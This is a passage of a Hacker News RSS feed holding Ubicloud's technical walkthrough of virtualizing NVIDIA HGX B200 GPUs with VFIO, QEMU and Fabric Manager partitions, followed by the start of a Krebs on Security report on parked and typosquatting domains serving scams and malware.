    <p id="fn1"><sup>1</sup> Honor obliges me to admit this is not literally true. <a href="http://bettermotherfuckingwebsite.com/">bettermotherfuckingwebsite.com</a> is a fucking pedagogical masterpiece and reshaped how I built my own site. But let's not spoil the bit... <a href="#fnref1">↩</a></p>
</section>



<!-- Mock server for demos - in real life, your actual server would return HTML -->




</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Virtualizing Nvidia HGX B200 GPUs with Open Source (102 pts)]]></title>
            <link>https://www.ubicloud.com/blog/virtualizing-nvidia-hgx-b200-gpus-with-open-source</link>
            <guid>46312792</guid>
            <pubDate>Thu, 18 Dec 2025 14:04:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.ubicloud.com/blog/virtualizing-nvidia-hgx-b200-gpus-with-open-source">https://www.ubicloud.com/blog/virtualizing-nvidia-hgx-b200-gpus-with-open-source</a>, See on <a href="https://news.ycombinator.com/item?id=46312792">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-animation="default" data-collapse="medium" data-duration="400" data-easing="ease" data-easing2="ease" data-doc-height="1" role="banner"><div><p>EuroGPT Enterprise is open source, runs in Europe, and keeps your data private. <a href="https://www.ubicloud.com/use-cases/eurogpt-enterprise">Try it now</a></p></div><div><p><a href="https://www.ubicloud.com/"><img src="https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/64fe48116c52fe1a51e17279_ubicolud%20logo.png" loading="lazy" alt=""></a></p></div></div><div id="w-node-decdb48f-56e8-4c35-c577-932285e9b439-b2fdc275"><p>December 15, 2025 · 12 min read</p><div><p><img src="https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/6661dbed4b73a7ac6d2e8757_ben.jpg" loading="lazy" sizes="(max-width: 513px) 100vw, 513px" srcset="https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/6661dbed4b73a7ac6d2e8757_ben-p-500.jpg 500w, https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/6661dbed4b73a7ac6d2e8757_ben.jpg 513w" alt="Burak Yucesoy"></p><div><p>Benjamin Satzger</p><p>Principal Software Engineer</p></div></div><div><p>We recently enabled GPU VMs on NVIDIA’s B200 HGX machines. These are impressive machines, but they are also surprisingly trickier to virtualize than the H100s. So we sifted through NVIDIA manual pages, Linux forums, hypervisor docs and we made virtualization work. It wasn’t like AWS or Azure was going to share how to do this, so we documented our findings.</p><p>This blog post might be interesting if you’d like to learn more about how NVIDIA GPUs are interconnected at the hardware level, the different virtualization models they support, or the software stack from the cards all the way up to the guest OS. If you have a few spare B200 HGX machines lying around, you’ll be able to run GPU VMs on them by the end - all with open source.</p></div><div><h3 id="HGX-B200-Hardware-Overview">HGX B200 Hardware Overview</h3><div><p>HGX is NVIDIA’s server-side reference platform for dense GPU compute. Instead of using PCIe cards connected through the host’s PCIe bus, HGX systems use SXM modules - GPUs mounted directly to a shared baseboard. NVIDIA’s earlier generation GPUs like Hopper came in both SXM and PCIe versions, but the B200 ships only with the SXM version.</p><p>Also, even when H100 GPUs use SXM&nbsp;modules, their HGX baseboard layouts look different than the B200s.</p></div><p><img src="https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/693c383404d026bcb1c48272_4f97b5c21382d5ab960646d6b89ececb_CPU%20complex.png" loading="lazy" sizes="(max-width: 767px) 100vw, (max-width: 991px) 727.9921875px, 939.984375px" srcset="https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/693c383404d026bcb1c48272_4f97b5c21382d5ab960646d6b89ececb_CPU%20complex-p-500.png 500w, https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/693c383404d026bcb1c48272_4f97b5c21382d5ab960646d6b89ececb_CPU%20complex-p-800.png 800w, https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/693c383404d026bcb1c48272_4f97b5c21382d5ab960646d6b89ececb_CPU%20complex-p-1080.png 1080w, https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/693c383404d026bcb1c48272_4f97b5c21382d5ab960646d6b89ececb_CPU%20complex.png 1246w" alt="afr calculation"></p><div><p>Within an HGX system, GPUs communicate through NVLink, which provides high-bandwidth GPU-to-GPU connectivity. NVSwitch modules merge these connections into a uniform all-to-all fabric, so every GPU can reach every other GPU with consistent bandwidth and latency. This creates a tightly integrated multi-GPU module rather than a collection of independent devices.</p><p>In short, the B200 HGX platform’s uniform, high-bandwidth architecture is excellent for performance - but less friendly to virtualization than discrete PCIe GPUs.</p></div></div><div><h3 id="Three-Virtualization-Models">Three Virtualization Models</h3><p>Because the B200’s GPUs operate as a tightly interconnected NVLink/NVSwitch fabric rather than as independent PCIe devices, only certain virtualization models are practical on HGX systems. A key component of this is NVIDIA Fabric Manager, the service responsible for bringing up the NVLink/NVSwitch fabric, programming routing tables, and enforcing isolation when GPUs are partitioned.</p><div><h4>Full Passthrough Mode</h4><p>In Full Passthrough Mode, a VM receives direct access to the GPUs it is assigned. For multi-GPU configurations, the VM also takes ownership of the associated NVSwitch fabric, running both the NVIDIA driver and Fabric Manager inside the guest. On an HGX B200 system, this results in two configurations:</p><ul role="list"><li>Single 8-GPU VM: Pass all 8 GPUs plus the NVSwitches to one VM. The guest owns the entire HGX complex and runs Fabric Manager, with full NVLink connectivity between all GPUs.</li><li>Multiple 1-GPU VMs: Disable NVLink for the GPU(s) and pass through a single GPU per VM. Each GPU then appears as an isolated PCIe-like device with no NVSwitch participation and no NVLink peer-to-peer traffic. ￼</li></ul></div><div><h4>Shared NVSwitch Multitenancy Mode</h4><p>GPUs are grouped into partitions. A partition acts like an isolated NVSwitch island. Tenants can receive 1, 2, 4, or 8 GPUs. GPUs inside a partition retain full NVLink bandwidth, while GPUs in different partitions cannot exchange traffic. Fabric Manager manages routing and enforces isolation between partitions.</p></div><div><h4>vGPU-based Multitenancy Mode</h4><p>vGPU uses mediated device slicing to allow multiple VMs to share a single physical GPU. The GPU’s memory and compute resources are partitioned, and NVLink/NVSwitch are not exposed to the guest. This mode is optimized for light compute workloads rather than high-performance inference or training workloads.</p></div><div><h4>Why Ubicloud Uses “Shared NVSwitch Multitenancy”</h4><div><p>Full Passthrough Mode is too limiting because it allows only “all 8 GPUs” or “1 GPU” assignments. Meanwhile, vGPU slicing is designed for fractional-GPU workloads and is not the best fit for high-performance ML use cases. Shared NVSwitch Multitenancy Mode provides the flexibility we need: it supports 1-, 2-, 4-, and 8-GPU VMs while preserving full GPU memory capacity and NVLink bandwidth within each VM.</p><p>With this context in place, the following sections describe how to run GPU VMs on the B200 using Shared NVSwitch Multitenancy Mode.</p></div></div></div><div><h3 id="Preparing-the-Host-for-Passthrough">Preparing the Host for Passthrough</h3><div><p>While the B200 GPUs are SXM modules, the Linux kernel still exposes them as PCIe devices. The procedure for preparing them for passthrough is similar: detach the GPUs from the host’s NVIDIA driver and bind them to the vfio-pci driver so that a hypervisor can assign them to a VM.</p><p>You can inspect the B200 GPUs via PCI ID 10de:2901:</p></div><pre contenteditable="false"><code><span>lspci -k -d 10de:2901
</span>17:00.0 3D controller: NVIDIA Corporation Device 2901 (rev a1)
        DeviceName: #GPU0
        Kernel driver in use: nvidia
... </code></pre><p>The <strong>10de</strong> vendor ID identifies NVIDIA, and <strong>2901</strong> corresponds specifically to the B200. You can consult<a href="https://download.nvidia.com/XFree86/Linux-x86_64/580.95.05/README/supportedchips.html"> Supported NVIDIA GPU Products</a> for a comprehensive list of NVIDIA GPUs and their corresponding device IDs.</p></div><div><h3 id="Switching-Drivers-On-the-Fly">Switching Drivers On-the-Fly</h3><div><p>During development, it’s common to switch between using the GPUs locally on the host and passing them through to a guest. The nvidia driver lets the host OS use the GPU normally, while vfio-pci isolates the GPU so a VM can control it. When a GPU is bound to vfio-pci, host tools like nvidia-smi won’t work. So switching drivers lets you alternate between host-side development and VM passthrough testing.</p><p>You can dynamically rebind the GPUs between the <strong>nvidia</strong> and <strong>vfio-pci</strong> drivers using their PCI bus addresses:</p></div><pre contenteditable="false"><code><span>DEVS="0000:17:00.0 0000:3d:00.0 0000:60:00.0 0000:70:00.0 0000:98:00.0 0000:bb:00.0 0000:dd:00.0 0000:ed:00.0"
</span><span></span><span>
</span><span>#</span><span> </span><span>bind</span><span> to vfio-pci</span><span>
</span>for d in $DEVS; do
  echo "$d" &gt; /sys/bus/pci/drivers/nvidia/unbind
  echo vfio-pci &gt; /sys/bus/pci/devices/$d/driver_override
  echo "$d" &gt; /sys/bus/pci/drivers_probe
  echo &gt; /sys/bus/pci/devices/$d/driver_override
done
<span></span><span>
</span><span>#</span><span> </span><span>bind</span><span> back to nvidia</span><span>
</span>for d in $DEVS; do
  echo "$d" &gt; /sys/bus/pci/drivers/vfio-pci/unbind
  echo nvidia &gt; /sys/bus/pci/devices/$d/driver_override
  echo "$d" &gt; /sys/bus/pci/drivers_probe
  echo &gt; /sys/bus/pci/devices/$d/driver_override
done
</code></pre><p>You can always verify the active driver by running: <br></p><pre contenteditable="false"><code><span>lspci -k -d 10de:2901</span></code></pre></div><div><h3 id="Permanently-Binding-B200-GPUs-to-vfio-pci">Permanently Binding B200 GPUs to vfio-pci</h3><p>For production passthrough scenarios, the GPUs should bind to vfio-pci automatically at boot. That requires configuring IOMMU support, preloading VFIO modules, and preventing the host NVIDIA driver from loading.</p><div><h4>1. Configure IOMMU and VFIO PCI IDs in GRUB</h4><p>Enable the IOMMU in passthrough mode and instruct the kernel to bind 10de:2901 devices to vfio-pci:</p><pre contenteditable="false"><code><span>#</span><span> Edit /etc/default/grub to include:</span><span>
</span>GRUB_CMDLINE_LINUX_DEFAULT="... intel_iommu=on iommu=pt 
vfio-pci.ids=10de:2901"</code></pre><p>Then apply the changes:</p><pre contenteditable="false"><code><span>update-grub</span></code></pre></div><div><h4>2. Preload VFIO Modules</h4><p>To guarantee the VFIO driver claims the devices before any other driver can attempt to initialize them, we ensure the necessary kernel modules are loaded very early during the boot process.</p><pre contenteditable="false"><code><span>tee /etc/modules-load.d/vfio.conf &lt;&lt;EOF
</span>vfio
vfio_iommu_type1
vfio_pci
EOF</code></pre></div><div><h4>3. Blacklist Host NVIDIA Drivers</h4><p>To prevent any potential driver conflicts, we stop the host kernel from loading the standard NVIDIA drivers by blacklisting them. This is essential for maintaining vfio-pci ownership for passthrough.</p><pre contenteditable="false"><code><span>tee /etc/modprobe.d/blacklist-nvidia.conf &lt;&lt;EOF
</span>blacklist nouveau
options nouveau modeset=0
blacklist nvidia
blacklist nvidia_drm
blacklist nvidiafb
EOF</code></pre></div><div><h4>4. Update Initramfs and Reboot</h4><p>Finally, apply all the module and driver configuration changes to the kernel's initial ramdisk environment and reboot the host system for the new configuration to take effect.</p><pre contenteditable="false"><code><span>update-initramfs -u
</span>reboot</code></pre><p>After the reboot, verification is key. Running <code>lspci -k -d 10de:2901 </code>should show all 8 GPUs are now correctly bound to the <strong>vfio-pci</strong> driver, confirming the host is ready for passthrough.All GPUs should show Kernel driver in use: <strong>vfio-pci</strong>.</p></div></div><div><h3 id="Matching-Versions-Between-Host-and-VM">Matching Versions Between Host and VM</h3><div><p>Once the host’s GPUs are configured for being passed through, the next critical requirement is ensuring that the NVIDIA driver stack on the host and inside each VM are aligned. Unlike full passthrough mode - where each VM initializes its own GPUs and NVSwitch fabric - Shared NVSwitch Multitenancy places Fabric Manager entirely on the host or a separate service vm. The host (or the service vm) is responsible for bringing up the NVSwitch topology, defining GPU partitions, and enforcing isolation between tenants.</p><p>Because of this architecture, the VM’s GPU driver must match the host’s Fabric Manager version exactly. Even minor mismatches can result in CUDA initialization failures, missing NVLink connectivity, or cryptic runtime errors.</p><p>A second important requirement for the B200 HGX platform is that it only supports the NVIDIA "open" driver variant. The legacy proprietary stack cannot operate the B200. Both host and guest must therefore use the nvidia-open driver family.</p></div><div><h4 id="Host-Configuration">Host Configuration</h4><p>On the host, after enabling the<a href="https://docs.nvidia.com/cuda/cuda-installation-guide-linux/#ubuntu"> CUDA repository</a>, install the components that bring up and manage the NVSwitch fabric:</p><pre contenteditable="false"><code><span>apt install nvidia-fabricmanager nvlsm</span></code></pre><p>You can verify the installed Fabric Manager version with:<br></p><pre contenteditable="false"><code><span>dpkg -l nvidia-fabricmanager
</span>Name&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Version
===============-==================
nvidia-fabricmanager 580.95.05</code></pre></div><div><h4 id="Boot-Image-Requirements">Boot Image Requirements</h4><p>Our VM images begin as standard Ubuntu cloud images. We customize them with virt-customize to install the matching <strong>nvidia-open</strong> driver:</p><pre contenteditable="false"><code><span>dpkg -l nvidia-open
</span>Name            Version
===============-==================
nvidia-open     580.95.05</code></pre><div><p>To build our fully "batteries-included" AI-ready VM images, we also install and configure additional components such as the NVIDIA Container Toolkit, along with other runtime tooling commonly needed for training and inference workloads.</p><p>With driver versions aligned and the necessary tooling in place, each VM can access its assigned GPU partition with full NVLink bandwidth within the NVSwitch island, providing a seamless environment for high-performance ML workloads.</p></div></div></div><div><h3 id="The-PCI-Topology-Trap">The PCI Topology Trap</h3><p>Our initial implementation used Cloud Hypervisor, which generally works well for CPU-only VMs and for passthrough of traditional PCIe GPUs. After binding the B200 GPUs to vfio-pci, we launched a VM like this:</p><pre contenteditable="false"><code><span>cloud-hypervisor \
</span>  ... # CPU/disk/network parameters omitted
  --device path=/sys/bus/pci/devices/0000:17:00.0/</code></pre><p>Inside the VM, the driver loaded cleanly and nvidia-smi looked perfectly healthy:</p><pre contenteditable="false"><code><span>nvidia-smi
</span>
+-----------------------------------------------------------------------------------------+
| NVIDIA-SMI 580.95.05              Driver Version: 580.95.05      CUDA Version: 13.0     |
...
|=========================================+========================+======================|
|   0  NVIDIA B200                    On  |   00000000:00:04.0 Off |                    0 |
+-----------------------------------------+------------------------+----------------------+</code></pre><div><p>For a PCIe GPU, this would be the end of the story.</p><p>But on the B200, CUDA initialization consistently failed, even though nvidia-smi reported no issues:</p></div><pre contenteditable="false"><code><span>python3 - &lt;&lt;'PY'
</span>import ctypes
cuda = ctypes.CDLL('libcuda.so.1')
err = cuda.cuInit(0)
s = ctypes.c_char_p()
cuda.cuGetErrorString(err, ctypes.byref(s))
print("cuInit -&gt;", err, (s.value.decode() if s.value else "&lt;?&gt;"))
PY

cuInit -&gt; 3 initialization error</code></pre><p>At this point, it was clear that if CUDA can’t initialize, something fundamental in the virtualized hardware model is wrong. Other users had reported identical symptoms on HGX B200 systems. (e.g. <a href="https://forums.developer.nvidia.com/t/vfio-passthrough-for-hgx-b200-system/339906">https://forums.developer.nvidia.com/t/vfio-passthrough-for-hgx-b200-system/339906</a>)</p><div><h4 id="The-Topology-Mismatch">The Topology Mismatch</h4><p>A critical difference emerged when comparing the PCI tree on the host to the PCI tree inside the VM. Inside the VM, the GPU sat directly under the PCI root complex:</p><pre contenteditable="false"><code><span>lspci -tv -d 10de:2901 
</span>-[0000:00]---04.0  NVIDIA Corporation Device 2901</code></pre><p>But on the host, the B200 GPU sits several levels deep behind PCIe bridges and root ports:</p><pre contenteditable="false"><code><span>lspci -tv -d 10de:2901
</span>-[0000:00]-+-[0000:14]---02.0-[15-1a]----00.0-[16-1a]----00.0-[17]----00.0  NVIDIA Corporation Device 2901</code></pre><div><p>The HGX architecture- and specifically CUDA’s initialization logic for B200-class GPUs - expects a multi-level PCIe hierarchy. Presenting a flat topology (GPU directly under the root complex) causes CUDA to abort early, even though the driver probes successfully.</p><p>Cloud Hypervisor does not currently provide a way to construct a deeper, host-like PCIe hierarchy. QEMU, however, does.</p></div></div><div><h4 id="Switching-to-QEMU-for-Custom-PCI-Layouts">Switching to QEMU for Custom PCI Layouts</h4><p>Launching the VM with QEMU using a plain VFIO device still produced the same flat topology:</p><pre contenteditable="false"><code><span>qemu-system-x86_64 \
</span> ... # CPU/disk/network params omitted
-device vfio-pci,host=0000:17:00.0</code></pre><p>But QEMU allows you to insert PCIe root ports and attach devices behind them, recreating a realistic hierarchy:</p><pre contenteditable="false"><code><span>qemu-system-x86_64 \
</span>  ... # CPU/disk/network params omitted
  -device pcie-root-port,id=rp1 \
  -device vfio-pci,host=0000:17:00.0,bus=rp1</code></pre><p>Inside the VM, the topology now looked like this:</p><pre contenteditable="false"><code><span>lspci -tv
</span>-[0000:00]-+-04.0-[01]----00.0  NVIDIA Corporation Device 2901</code></pre><p>This layout mirrors the host’s structure: the GPU sits behind a root port, not directly under the root complex. With that change in place, CUDA initializes normally:</p><pre contenteditable="false"><code><span>cuInit -&gt; 0 no error</span></code></pre><p>Now we’re in business!</p></div></div><div><h3 id="The-Large-BAR-Stall-Problem">The Large-BAR Stall Problem</h3><div><p>With the PCI topology corrected, GPU passthrough worked reliably once the VM was up. However, a new issue emerged when passing through multiple B200 GPUs - especially 4 or 8 at a time. VM boot would stall for several minutes, and in extreme cases even over an hour before the guest firmware handed off to the operating system.</p><p>After investigating, we traced the issue to the enormous PCI Base Address Registers (BARs) on the B200. These BARs expose large portions of the GPU’s memory aperture to the host, and they must be mapped into the guest’s virtual address space during boot.</p><p>You can see the BAR sizes with:</p></div><pre contenteditable="false"><code><span>lspci -vvv -s 17:00.0 | grep Region
</span>Region 0: Memory at 228000000000 (64-bit, prefetchable) [size=64M]
Region 2: Memory at 220000000000 (64-bit, prefetchable) [size=256G]
Region 4: Memory at 228044000000 (64-bit, prefetchable) [size=32M]</code></pre><p>The critical one is Region 2, a 256 GB BAR. QEMU, by default, mmaps the entire BAR into the guest, meaning:</p><ul role="list"><li>1 GPU → ~256 GB of virtual address space</li><li>8 GPUs → ~2 TB of guest virtual address space</li></ul><p>Older QEMU versions (such as 8.2, which ships with Ubuntu 24.04) map these huge BARs extremely slowly, resulting in multi-minute or hour-long stalls during guest initialization.</p><div><h4 id="Solution-1-Upgrade-to-QEMU-10.1">Solution 1: Upgrade to QEMU 10.1+</h4><p>QEMU 10.1 includes major optimizations for devices with extremely large BARs. With these improvements, guest boot times return to normal even when passing through all eight GPUs.</p></div><div><h4 id="Solution-2-Disable-BAR-mmap-x-no-mmap-true">Solution 2: Disable BAR mmap (x-no-mmap=true)</h4><p>If upgrading QEMU or reserving large amounts of memory is not feasible, you can instruct QEMU not to mmap the large BARs directly, dramatically reducing the amount of virtual memory the guest must reserve:</p><pre contenteditable="false"><code><span>qemu-system-x86_64 \
</span>  ... # CPU/disk/network parameters omitted
  -device pcie-root-port,id=rp1 \
  -device vfio-pci,host=0000:17:00.0,bus=rp1,x-no-mmap=true</code></pre><p>With x-no-mmap=true, QEMU avoids mapping the BARs into the guest’s virtual address space and instead uses a slower emulated access path. In practice:</p><ul role="list"><li>Virtual memory consumption becomes small and constant</li><li>Guest boot times become fast and predictable</li><li>Most real-world AI training and inference workloads show little to no measurable performance impact, since they do not heavily exercise BAR-access paths</li></ul><p>Only workloads that directly access the BAR region at high rates may observe reduced performance.</p></div></div><div><h3 id="Fabric-Manager-and-Partition-Management">Fabric Manager and Partition Management</h3><div><p>With passthrough and PCI topology resolved, the final piece of Shared NVSwitch Multitenancy is partition management. In this mode, the host’s Fabric Manager controls how the eight B200 GPUs are grouped into isolated NVSwitch “islands”, each of which can be assigned to a VM.</p><p>Fabric Manager operates according to a mode defined in:</p></div><pre contenteditable="false"><code><span>/usr/share/nvidia/nvswitch/fabricmanager.cfg</span></code></pre><p>The key setting is:</p><pre contenteditable="false"><code><span>#</span><span> Fabric Manager Operating Mode</span><span>
</span><span></span><span>#</span><span> 0 - Bare-metal or full passthrough mode</span><span>
</span><span></span><span>#</span><span> 1 - Shared NVSwitch multitenancy</span><span>
</span><span></span><span>#</span><span> 2 - vGPU-based multitenancy</span><span>
</span>FABRIC_MODE=1</code></pre><p>After updating the configuration:</p><pre contenteditable="false"><code><span>systemctl restart nvidia-fabricmanager</span></code></pre><p>With FABRIC_MODE=1, Fabric Manager starts in Shared NVSwitch Multitenancy Mode and exposes an API for activating and deactivating GPU partitions.</p><div><h4 id="Predefined-HGX-B200-Partitions">Predefined HGX B200 Partitions</h4><p>For an 8-GPU HGX system, NVIDIA defines a set of non-overlapping partitions that cover all common VM sizes (1, 2, 4, and 8 GPUs). Fabric Manager only allows one active partition per GPU; attempting to activate an overlapping partition will fail.</p><div><table><thead><tr><th>Partitions ID</th><th>Number of GPUs</th><th>GPU ID</th></tr></thead><tbody><tr><td>1</td><td>8</td><td>1 to 8</td></tr><tr><td>2</td><td>4</td><td>1 to 4</td></tr><tr><td>3</td><td>4</td><td>5 to 8</td></tr><tr><td>4</td><td>2</td><td>1, 2</td></tr><tr><td>5</td><td>2</td><td>3, 4</td></tr><tr><td>6</td><td>2</td><td>5, 6</td></tr><tr><td>7</td><td>2</td><td>7, 8</td></tr><tr><td>8</td><td>1</td><td>1</td></tr><tr><td>9</td><td>1</td><td>2</td></tr><tr><td>10</td><td>1</td><td>3</td></tr><tr><td>11</td><td>1</td><td>4</td></tr><tr><td>12</td><td>1</td><td>5</td></tr><tr><td>13</td><td>1</td><td>6</td></tr><tr><td>14</td><td>1</td><td>7</td></tr><tr><td>15</td><td>1</td><td>8</td></tr></tbody></table><p>Drag table left or right to see remaining content</p></div><p>These predefined layouts ensure that GPU groups always form valid NVSwitch “islands” with uniform bandwidth.</p></div><div><h4 id="GPU-IDs-Are-Not-PCI-Bus-IDs">GPU IDs Are Not PCI Bus IDs</h4><div><p>A critical detail: GPU IDs used by Fabric Manager do not correspond to PCI addresses, nor to the order that lspci lists devices. Instead, GPU IDs are derived from the “Module Id” field reported by the driver.</p><p>You can find each GPU’s Module ID via:</p></div><pre contenteditable="false"><code><span>nvidia-smi -q</span></code></pre><p>Example:</p><pre contenteditable="false"><code><span>GPU 00000000:17:00.0
</span>  Product Name                  : NVIDIA B200
  ...
  Platform Info
      Peer Type                 : Switch Connected
      Module Id                 : 1</code></pre><p>This Module ID (1–8) is the index used by partition definitions, activation commands, and NVSwitch routing logic. When passing devices to a VM, you must map Fabric Manager GPU Module IDs → PCI devices, not assume PCI order.</p></div><div><h4 id="Interacting-with-the-Fabric-Manager-API">Interacting with the Fabric Manager API</h4><pre contenteditable="false"><code><span>fmpm -l
</span><span></span><span>#</span><span> lists all partitions, their sizes, status (active/inactive)</span><span>
</span>
fmpm -a 3
<span></span><span>#</span><span> activate partition ID 3</span><span>
</span>
fmpm -d 3
<span></span><span>#</span><span> deactivate partition ID 3</span></code></pre></div><div><h4 id="Provisioning-Flow">Provisioning Flow</h4><p>Putting everything together, the high-level flow for provisioning a GPU-enabled VM looks like this:</p><ul role="list"><li>A user requests a VM with X GPUs.</li><li>The management system selects a free partition of size X.</li><li>It activates the partition: fmpm -a &lt;Partition ID&gt;.</li><li>Fabric Manager configures NVSwitch routing accordingly.</li><li>The system passes through the GPUs corresponding to the Module Ids of that partition into the VM.</li><li>The VM boots; inside it, nvidia-smi topo -m shows full NVLink connectivity within the partition.</li><li>After VM termination, the system calls fmpm -d &lt;Partition ID&gt; to release the partition.</li></ul><p>This workflow gives each tenant access to high-performance GPU clusters with full bandwidth and proper isolation, making the B200 HGX platform viable for multi-tenant AI workloads.</p></div></div><div><h3 id="Closing-Thoughts-Open-Source-GPU-Virtualization-on-HGX-B200">Closing Thoughts: Open-Source GPU Virtualization on HGX B200</h3><div><p>Getting NVIDIA’s HGX B200 platform to behave naturally in a virtualized, multi-tenant environment requires careful alignment of many layers: PCI topology, VFIO configuration, driver versioning, NVSwitch partitioning, and hypervisor behavior. When these pieces fit together, the result is a flexible, high-performance setup where tenants receive full-bandwidth NVLink inside their VM while remaining fully isolated from other workloads.</p><p>A final note we care about: everything described in this post is implemented in the open. Ubicloud is a fully open-source cloud platform, and the components that manage GPU allocation, activate NVSwitch partitions, configure passthrough, and launch VMs are all public and available for anyone to inspect, adapt, or contribute to.</p><p>If you’d like to explore how this works behind the scenes, here are good entry points:</p></div></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[AI helps ship faster but it produces 1.7× more bugs (195 pts)]]></title>
            <link>https://www.coderabbit.ai/blog/state-of-ai-vs-human-code-generation-report</link>
            <guid>46312159</guid>
            <pubDate>Thu, 18 Dec 2025 13:06:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.coderabbit.ai/blog/state-of-ai-vs-human-code-generation-report">https://www.coderabbit.ai/blog/state-of-ai-vs-human-code-generation-report</a>, See on <a href="https://news.ycombinator.com/item?id=46312159">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h3>Why 2025 was the year the internet kept breaking: Studies show incidents are increasing</h3><p>Rising outages, rising risks: What the data tells us
In October, the founder of www.IsDown.app went on Reddit to share some disturbing charts. His website, an authoritative source on whether a website is down or not, has been tracking outages since 2...</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Most parked domains now serving malicious content (133 pts)]]></title>
            <link>https://krebsonsecurity.com/2025/12/most-parked-domains-now-serving-malicious-content/</link>
            <guid>46312021</guid>
            <pubDate>Thu, 18 Dec 2025 12:50:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://krebsonsecurity.com/2025/12/most-parked-domains-now-serving-malicious-content/">https://krebsonsecurity.com/2025/12/most-parked-domains-now-serving-malicious-content/</a>, See on <a href="https://news.ycombinator.com/item?id=46312021">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
												<p>Direct navigation — the act of visiting a website by manually typing a domain name in a web browser — has never been riskier: A new study finds the vast majority of “parked” domains — mostly expired or dormant domain names, or common misspellings of popular websites — are now configured to redirect visitors to sites that foist scams and malware.</p>
<div id="attachment_72861"><p><img aria-describedby="caption-attachment-72861" decoding="async" src="https://krebsonsecurity.com/wp-content/uploads/2025/12/ic3org.png" alt="" width="783" height="367" srcset="https://krebsonsecurity.com/wp-content/uploads/2025/12/ic3org.png 783w, https://krebsonsecurity.com/wp-content/uploads/2025/12/ic3org-768x360.png 768w" sizes="(max-width: 783px) 100vw, 783px"></p><p id="caption-attachment-72861">A lookalike domain to the FBI Internet Crime Complaint Center website, returned a non-threatening parking page (left) whereas a mobile user was instantly directed to deceptive content in October 2025 (right). Image: Infoblox.</p></div>
<p>When Internet users try to visit expired domain names or accidentally navigate to a lookalike “typosquatting” domain, they are typically brought to a placeholder page at a domain parking company that tries to monetize the wayward traffic by displaying links to a number of third-party websites that have paid to have their links shown.</p>
<p>A decade ago, ending up at one of these parked domains came with a relatively small chance of being redirected to a malicious destination: In 2014, researchers <a href="https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-alrwais.pdf" target="_blank" rel="noopener">found</a> (PDF) that parked domains redirected users to malicious sites less than five percent of the time — regardless of whether the visitor clicked on any links at the parked page.</p>
<p>But in a series of experiments over the past few months, researchers at the security firm <strong>Infoblox</strong> say they discovered the situation is now reversed, and that malicious content is by far the norm now for parked websites.</p>
<p>“In large scale experiments, we found that over 90% of the time, visitors to a parked domain would be directed to illegal content, scams, scareware and anti-virus software subscriptions, or malware, as the ‘click’ was sold from the parking company to advertisers, who often resold that traffic to yet another party,” Infoblox researchers wrote in <a href="https://blogs.infoblox.com/threat-intelligence/parked-domains-become-weapons-with-direct-search-advertising/" target="_blank" rel="noopener">a paper published today</a>.</p>
<p>Infoblox found parked websites are benign if the visitor arrives at the site using a virtual private network (VPN), or else via a non-residential Internet address. For example, <strong>Scotiabank.com</strong> customers who accidentally mistype the domain as <strong>scotaibank[.]com</strong> will see a normal parking page if they’re using a VPN, but will be redirected to a site that tries to foist scams, malware or other unwanted content if coming from a residential IP address. Again, this redirect happens just by visiting the misspelled domain with a mobile device or desktop computer that is using a residential IP address.</p>
<p>According to Infoblox, the person or entity that owns scotaibank[.]com has a portfolio of nearly 3,000 lookalike domains, including <strong>gmai[.]com</strong>, which demonstrably has been configured with its own mail server for accepting incoming email messages. Meaning, if you send an email to a Gmail user and accidentally omit the “l” from “gmail.com,” that missive doesn’t just disappear into the ether or produce a bounce reply: It goes straight to these scammers. The report notices this domain also has been leveraged in multiple recent business email compromise campaigns, using a lure indicating a failed payment with trojan malware attached.</p>
<p>Infoblox found this particular domain holder (betrayed by a common DNS server — torresdns[.]com) has set up typosquatting domains targeting dozens of top Internet destinations, including <strong>Craigslist</strong>, <strong>YouTube</strong>, <strong>Google</strong>, <strong>Wikipedia</strong>, <strong>Netflix</strong>, <strong>TripAdvisor</strong>, <strong>Yahoo</strong>, <strong>eBay</strong>, and <strong>Microsoft</strong>. A defanged list of these typosquatting domains is <a href="https://krebsonsecurity.com/wp-content/uploads/2025/12/torresdns.txt" target="_blank" rel="noopener">available here</a> (the dots in the listed domains have been replaced with commas).<span id="more-72848"></span></p>
<p><strong>David Brunsdon</strong>, a threat researcher at Infoblox, said the parked pages send visitors through a chain of redirects, all while profiling the visitor’s system using IP geolocation, device fingerprinting, and cookies to determine where to redirect domain visitors.</p>
<p>“It was often a chain of redirects — one or two domains outside the parking company — before threat arrives,” Brunsdon said. “Each time in the handoff the device is profiled again and again, before being passed off to a malicious domain or else a decoy page like Amazon.com or Alibaba.com if they decide it’s not worth targeting.”</p>
<p>Brunsdon said domain parking services claim the search results they return on parked pages are designed to be relevant to their parked domains, but that almost none of this displayed content was related to the lookalike domain names they tested.</p>
